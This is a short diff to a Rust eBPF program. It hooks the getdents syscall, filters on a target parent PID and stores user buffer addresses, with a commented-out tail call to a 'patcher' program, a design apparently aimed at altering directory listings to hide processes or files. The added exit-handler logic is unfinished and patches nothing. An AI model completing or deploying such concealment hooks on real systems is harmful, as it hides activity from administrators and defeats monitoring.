@@ -56,7 +56,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
             bpf_probe_read_kernel::<i32>(
                 (real_parent.unwrap() as usize + offset_of!(task_struct, tgid)) as *const i32,
             )
-            .unwrap()
+                .unwrap()
         };
 
         if ppid != *the_target_ppid {
@@ -88,6 +88,20 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid();
     let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
+
+    if total_bytes_read <= 0 {
+        return Ok(0);
+    }
+
+    if let Some(pbuff_addr) = unsafe { map_buffs.get(&pid_tgid) } {
+        let buff_addr = *pbuff_addr;
+        let pid = pid_tgid >> 32;
+
+        let d_reclen = 0;
+    } else {
+        return Ok(0);
+    }
+
     info!(&ctx, "total_bytes_read is {}", total_bytes_read);
     // unsafe {
     //     if JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).is_err() {
